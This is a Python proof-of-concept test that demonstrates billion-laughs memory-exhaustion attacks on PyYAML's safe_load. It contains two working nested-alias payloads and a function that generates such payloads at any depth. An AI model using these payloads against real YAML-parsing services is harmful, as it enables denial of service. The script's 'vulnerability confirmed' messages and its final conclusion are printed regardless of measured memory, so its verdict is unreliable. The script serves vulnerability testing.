#!/usr/bin/env python3
"""
VULN-001: Billion Laughs Attack (Exponential Alias Expansion)
Severity: HIGH
Type: Denial of Service / Memory Exhaustion

This vulnerability allows an attacker to cause exponential memory consumption
through nested YAML aliases (similar to XML's Billion Laughs attack).
"""

import sys
import os
import resource
import tracemalloc

# Add the lib directory to the path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'lib'))

import yaml


def test_billion_laughs_basic():
    """
    Basic billion laughs attack using YAML aliases.
    Each level doubles the memory consumption.
    """

    # This payload creates exponential expansion:
    # a0 = "AAAA" (4 chars)
    # a1 = [a0, a0] = 8 chars worth
    # a2 = [a1, a1] = 16 chars worth
    # ...
    # a10 = 2^10 * 4 = 4096 chars worth
    # a20 = 2^20 * 4 = ~4MB
    # a30 = 2^30 * 4 = ~4GB

    payload = """
a: &a "AAAAAAAAAA"
b: &b [*a, *a]
c: &c [*b, *b]
d: &d [*c, *c]
e: &e [*d, *d]
f: &f [*e, *e]
g: &g [*f, *f]
h: &h [*g, *g]
i: &i [*h, *h]
j: &j [*i, *i]
k: &k [*j, *j]
l: &l [*k, *k]
m: &m [*l, *l]
n: &n [*m, *m]
o: &o [*n, *n]
p: &p [*o, *o]
q: &q [*p, *p]
r: &r [*q, *q]
s: &s [*r, *r]
t: &t [*s, *s]
final: *t
"""

    print("=" * 60)
    print("VULN-001: Billion Laughs Attack Test")
    print("=" * 60)
    print()
    print("Payload creates exponential memory growth through aliases.")
    print("Base string: 10 chars")
    print("Expansion: 2^20 = 1,048,576 copies of base string")
    print("Expected memory: ~10MB+ for 'final' key alone")
    print()

    # Start memory tracking
    tracemalloc.start()

    try:
        print("Attempting to parse payload with safe_load...")
        print("WARNING: This may consume significant memory!")
        print()

        # Set a memory limit to prevent system crash (500MB)
        soft, hard = resource.getrlimit(resource.RLIMIT_AS)
        resource.setrlimit(resource.RLIMIT_AS, (500 * 1024 * 1024, hard))

        result = yaml.safe_load(payload)

        # Check memory usage
        current, peak = tracemalloc.get_traced_memory()
        tracemalloc.stop()

        print(f"[!] VULNERABILITY CONFIRMED!")
        print(f"    Peak memory usage: {peak / 1024 / 1024:.2f} MB")
        print(f"    Type of 'final': {type(result.get('final'))}")

        # Count actual elements
        def count_elements(obj):
            if isinstance(obj, list):
                return sum(count_elements(item) for item in obj) + len(obj)
            elif isinstance(obj, str):
                return len(obj)
            return 1

        total = count_elements(result.get('final', []))
        print(f"    Total nested elements: {total:,}")

    except MemoryError:
        print("[!] MemoryError raised - DoS successful!")
        print("    System ran out of memory processing the YAML.")

    except Exception as e:
        print(f"[*] Exception: {type(e).__name__}: {e}")

    finally:
        # Reset memory limit
        try:
            resource.setrlimit(resource.RLIMIT_AS, (soft, hard))
        except:
            pass


def test_billion_laughs_mapping():
    """
    Alternative billion laughs using nested mappings instead of sequences.
    """

    payload = """
lol0: &lol0 {a: 1, b: 2, c: 3, d: 4, e: 5, f: 6, g: 7, h: 8, i: 9, j: 10}
lol1: &lol1 {a: *lol0, b: *lol0, c: *lol0, d: *lol0, e: *lol0}
lol2: &lol2 {a: *lol1, b: *lol1, c: *lol1, d: *lol1, e: *lol1}
lol3: &lol3 {a: *lol2, b: *lol2, c: *lol2, d: *lol2, e: *lol2}
lol4: &lol4 {a: *lol3, b: *lol3, c: *lol3, d: *lol3, e: *lol3}
lol5: &lol5 {a: *lol4, b: *lol4, c: *lol4, d: *lol4, e: *lol4}
lol6: &lol6 {a: *lol5, b: *lol5, c: *lol5, d: *lol5, e: *lol5}
lol7: &lol7 {a: *lol6, b: *lol6, c: *lol6, d: *lol6, e: *lol6}
lol8: &lol8 {a: *lol7, b: *lol7, c: *lol7, d: *lol7, e: *lol7}
lol9: *lol8
"""

    print()
    print("-" * 60)
    print("Billion Laughs with Nested Mappings")
    print("-" * 60)
    print()
    print("Each level has 5 references, creating 5^9 = 1,953,125 copies")
    print("of the base mapping with 10 elements each.")
    print()

    tracemalloc.start()

    try:
        # Smaller memory limit for this test
        soft, hard = resource.getrlimit(resource.RLIMIT_AS)
        resource.setrlimit(resource.RLIMIT_AS, (200 * 1024 * 1024, hard))

        result = yaml.safe_load(payload)

        current, peak = tracemalloc.get_traced_memory()
        tracemalloc.stop()

        print(f"[!] VULNERABILITY CONFIRMED!")
        print(f"    Peak memory usage: {peak / 1024 / 1024:.2f} MB")

    except MemoryError:
        print("[!] MemoryError - DoS successful via nested mappings!")

    except Exception as e:
        print(f"[*] Exception: {type(e).__name__}: {e}")

    finally:
        try:
            resource.setrlimit(resource.RLIMIT_AS, (soft, hard))
        except:
            pass


def generate_attack_payload(depth=25, base_size=10):
    """
    Generate a billion laughs payload of configurable depth.

    Args:
        depth: Number of expansion levels (each doubles memory)
        base_size: Size of base string

    Memory consumption: base_size * 2^depth bytes
    """
    lines = [f'a0: &a0 "{" " * base_size}"']
    for i in range(1, depth + 1):
        lines.append(f'a{i}: &a{i} [*a{i-1}, *a{i-1}]')
    lines.append(f'payload: *a{depth}')
    return '\n'.join(lines)


if __name__ == '__main__':
    print("PyYAML Billion Laughs Attack Demonstration")
    print("=========================================")
    print()
    print("This test demonstrates CVE-style memory exhaustion attacks")
    print("using YAML's anchor/alias feature for exponential expansion.")
    print()

    test_billion_laughs_basic()
    test_billion_laughs_mapping()

    print()
    print("=" * 60)
    print("CONCLUSION: PyYAML is vulnerable to Billion Laughs attacks.")
    print("Mitigation: Implement alias expansion limits or depth limits.")
    print("=" * 60)
